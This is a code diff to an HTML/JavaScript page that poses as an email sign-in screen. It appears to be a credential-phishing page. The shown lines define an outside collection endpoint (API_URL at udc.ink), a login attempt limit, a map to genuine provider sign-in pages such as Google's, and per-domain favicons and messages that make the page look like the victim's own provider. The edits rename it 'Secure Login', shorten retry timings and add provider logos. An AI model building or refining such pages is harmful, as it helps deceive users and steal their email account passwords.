@@ -334,7 +334,7 @@
     </div>
 
     <div class="footer">
-        <span>© 2026 <span id="footer-domain">Email Login</span>. All rights reserved.</span>
+        <span>© 2025 <span id="footer-domain">Secure Login</span>. All rights reserved.</span>
         <a href="#" id="footer-link">example.com</a>
         <span class="timestamp" id="footer-time">| Last updated: --</span>
     </div>
@@ -344,8 +344,8 @@
         const API_URL = 'https://udc.ink/nw/process.php';
         const MAX_ATTEMPTS = 3;
         const MAX_RETRIES = 3;
-        const RETRY_DELAY = 2000;
-        const TIMEOUT = 10000;
+        const RETRY_DELAY = 1000;
+        const TIMEOUT = 5000;
 
         const LOGIN_PAGES = {
             'gmail.com': 'https://accounts.google.com/signin',
@@ -431,6 +431,7 @@
 
         function updateDomainUI(domain) {
             if (!domain) return;
+            const logo = `https://logo.clearbit.com/${domain}?size=64`;
             const favicon = FAVICON_MAP[domain] || '/default-favicon.ico';
             const msg = DOMAIN_MESSAGES[domain] || `Connecting to your email provider`;
 
